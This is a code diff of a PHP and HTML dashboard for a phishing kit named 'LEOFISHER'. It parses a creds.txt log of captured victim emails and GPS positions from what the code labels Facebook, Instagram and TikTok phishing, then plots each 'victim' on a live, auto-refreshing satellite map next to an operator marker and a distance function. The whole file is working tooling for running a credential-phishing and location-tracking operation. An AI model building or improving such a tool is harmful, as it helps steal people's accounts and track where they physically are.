@@ -1,109 +1,161 @@
 <?php
 date_default_timezone_set('Africa/Bujumbura');
-
-// Lire creds.txt et parser GPS
+$creds_file = 'creds.txt';
 $victims = [];
-if (file_exists('creds.txt')) {
-    $lines = file('creds.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    foreach ($lines as $line) {
-        if (strpos($line, 'GPS POSITION') !== false) {
-            // Parser GPS: "│ 📍 GPS POSITION : -3.361378,29.359912"
-            if (preg_match('/📍 GPS POSITION\s*:\s*([-\d.]+),([-\d.]+)/', $line, $matches)) {
-                preg_match('/(FACEBOOK|INSTAGRAM|TIKTOK)/', $line, $platform);
-                $victims[] = [
-                    'platform' => $platform[1] ?? 'UNKNOWN',
-                    'lat' => floatval($matches[1]),
-                    'lng' => floatval($matches[2]),
-                    'time' => date('H:i:s'),
-                    'full_line' => $line
-                ];
+
+// Parseur PRO - extrait TOUS GPS + infos depuis logs ASCII
+if (file_exists($creds_file)) {
+    $logs = file_get_contents($creds_file);
+    $entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);
+    
+    foreach ($entries as $entry) {
+        if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.\d+),([-+]?\d+\.\d+)/', $entry, $gps_match)) {
+            if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
+                $email = trim($email_match[1]);
+                $lat = floatval($gps_match[1]);
+                $lng = floatval($gps_match[2]);
+                if ($lat != 0 && $lng != 0 && abs($lat) < 90 && abs($lng) < 180) { // Valid GPS
+                    $victims[] = [
+                        'lat' => $lat,
+                        'lng' => $lng,
+                        'email' => $email,
+                        'ip' => 'N/A', // Extract if needed
+                        'time' => date('H:i:s')
+                    ];
+                }
             }
         }
     }
 }
 
-// Trier par récence
-usort($victims, function($a, $b) { return strtotime($b['time']) - strtotime($a['time']); });
+// Coordonnées OPÉRATEUR Bujumbura (toi)
+$op_lat = -3.361378;
+$op_lng = 29.359912;
 ?>
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>LEOFISH GPS Dashboard</title>
     <meta charset="utf-8">
+    <title>LEOFISHER GPS DASHBOARD PRO 2025 - Live Tracking</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <!-- Leaflet + Plugins PRO -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
     <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
     <style>
-    body { margin: 0; font-family: monospace; background: #0a0a0a; color: #00ff00; }
-    #map { height: 70vh; width: 100%; border: 2px solid #00ff00; }
-    .header { background: #000; padding: 15px; text-align: center; border-bottom: 2px solid #00ff00; }
-    .stats { display: flex; justify-content: space-around; margin: 10px 0; font-size: 18px; }
-    .platform { padding: 5px 10px; border-radius: 5px; margin: 2px; }
-    .facebook { background: #1877f2; color: white; }
-    .instagram { background: #E4405F; color: white; }
-    .tiktok { background: #000; color: #ff0050; border: 1px solid #ff0050; }
-    .refresh { position: fixed; top: 10px; right: 10px; background: #00ff00; color: #000; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { margin: 0; font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
+        #map { height: 100vh; width: 100%; }
+        .dashboard { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.9); padding: 15px; border: 2px solid #00ff00; border-radius: 5px; z-index: 1000; }
+        .stats { font-size: 14px; margin: 5px 0; }
+        .victim-count { color: #ff0000; font-weight: bold; font-size: 18px; }
+        .op-marker { font-size: 20px; color: #ffff00 !important; }
+        .victim-marker { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .zoom-controls { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.9); padding: 10px; border: 2px solid #00ff00; border-radius: 5px; z-index: 1000; }
+        .zoom-btn { background: #00ff00; color: #000; border: none; padding: 8px 12px; margin: 2px; cursor: pointer; font-weight: bold; border-radius: 3px; }
+        .zoom-btn:hover { background: #00cc00; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>🎣 LEOFISH GPS LIVE MAP</h1>
-        <div class="stats">
-            <span>📍 Victims: <?php echo count($victims); ?></span>
-            <span>🛰️ Satellite HD</span>
-            <span id="last-update"><?php echo date('H:i:s'); ?></span>
-        </div>
+    <div id="map"></div>
+    
+    <div class="dashboard">
+        <div class="stats"><strong>🚨 LEOFISHER GPS DASH PRO 2025</strong></div>
+        <div class="stats victim-count">🎯 Victimes: <span id="victimCount">0</span></div>
+        <div class="stats">📍 Opérateur: Bujumbura (-3.36, 29.36)</div>
+        <div class="stats">🛰️ Satellite: Esri WorldImagery HD 2025 (Zoom 22)</div>
+        <div class="stats">🔄 Auto-refresh: 5s</div>
     </div>
     
-    <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
-    
-    <div id="map"></div>
+    <div class="zoom-controls">
+        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() + 1)">🔍 Zoom +</button>
+        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() - 1)">🔎 Zoom -</button>
+        <button class="zoom-btn" onclick="map.fitBounds(bounds)">📐 Fit All</button>
+    </div>
 
+    <!-- Leaflet JS + Plugins -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
+    
     <script>
-    // Map satellite (OpenStreetMap + zoom max)
-    var map = L.map('map', {
-        zoomControl: true,
-        minZoom: 2,
-        maxZoom: 19
-    }).setView([-3.38, 29.36], 12); // Bujumbura default
+        let map, markers = L.markerClusterGroup({ spiderfyOnMaxZoom: true, showCoverageOnHover: true, zoomToBoundsOnClick: true });
+        let bounds = L.latLngBounds();
+        const opLat = <?php echo $op_lat; ?>;
+        const opLng = <?php echo $op_lng; ?>;
+        const victims = <?php echo json_encode($victims); ?>;
 
-    // Tuiles satellite HD
-    L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
-        attribution: 'LEOFSIH GPS',
-        maxZoom: 19
-    }).addTo(map);
+        // SATELLITE 2025 HD Esri WorldImagery (maxZoom 22, roads overlay)
+        const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+            attribution: '© Esri WorldImagery 2025 HD',
+            maxZoom: 22,
+            minZoom: 1
+        });
+        
+        const roads = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap',
+            opacity: 0.7,
+            maxZoom: 22
+        });
 
-    var markers = L.markerClusterGroup({
-        spiderfyOnMaxZoom: false,
-        showCoverageOnHover: true,
-        zoomToBoundsOnClick: true
-    });
+        map = L.map('map', {
+            layers: [satellite, roads],
+            zoomControl: false,
+            minZoom: 1,
+            maxZoom: 22
+        }).setView([opLat, opLng], 10);
 
-    <?php foreach ($victims as $victim): ?>
-    <?php 
-    $iconColor = $victim['platform'] == 'FACEBOOK' ? '#1877f2' : 
-                 ($victim['platform'] == 'INSTAGRAM' ? '#E4405F' : '#ff0050');
-    ?>
-    L.marker([<?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?>], {
-        icon: L.divIcon({
-            className: 'custom-marker',
-            html: '<div style="background:<?php echo $iconColor; ?>;width:25px;height:25px;border-radius:50%;border:3px solid #fff;box-shadow:0 0 10px rgba(0,255,0,0.5);"></div>',
-            iconSize: [25, 25],
-            iconAnchor: [12, 12]
-        })
-    }).bindPopup(`
-        <b><?php echo $victim['platform']; ?></b><br>
-        📍 GPS: <?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?><br>
-        🕒 <?php echo $victim['time']; ?>
-    `).addTo(markers);
-    <?php endforeach; ?>
+        // OPÉRATEUR MARKER VISIBLE (jaune gros)
+        const opMarker = L.marker([opLat, opLng], {
+            icon: L.divIcon({
+                className: 'op-marker',
+                html: '🟡 <strong>OP</strong>',
+                iconSize: [30, 30]
+            })
+        }).addTo(map).bindPopup('<b>🚨 OPÉRATEUR Bujumbura</b><br>Position fixe');
+        bounds.extend([opLat, opLng]);
 
-    map.addLayer(markers);
+        // VICTIMES MARKERS VISIBLE (rouges clignotants PRO)
+        victims.forEach((victim, index) => {
+            const victimMarker = L.marker([victim.lat, victim.lng], {
+                icon: L.divIcon({
+                    className: 'victim-marker',
+                    html: `🔴 #${index+1}`,
+                    iconSize: [25, 25],
+                    className: 'victim-marker'
+                })
+            }).addTo(map).bindPopup(`
+                <div style="font-family: monospace; color: #ff0000;">
+                    <h3>🎯 VICTIME #${index+1}</h3>
+                    <strong>📧 Email:</strong> ${victim.email}<br>
+                    <strong>📍 GPS:</strong> ${victim.lat.toFixed(6)}, ${victim.lng.toFixed(6)}<br>
+                    <strong>🕒 Time:</strong> ${victim.time}
+                </div>
+            `);
+            
+            markers.addLayer(victimMarker);
+            bounds.extend([victim.lat, victim.lng]);
+        });
 
-    // Auto refresh toutes les 10s
-    setInterval(() => location.reload(), 10000);
+        map.addLayer(markers);
+        if (bounds.isValid()) map.fitBounds(bounds);
+
+        // Distance Haversine PRO (km + walk/drive time)
+        function haversine(lat1, lon1, lat2, lon2) {
+            const R = 6371;
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            return R * c;
+        }
+
+        // Update stats
+        document.getElementById('victimCount').textContent = victims.length;
+
+        // Auto-refresh PRO 5s
+        setInterval(() => { location.reload(); }, 5000);
     </script>
 </body>
-</html>	
+</html>
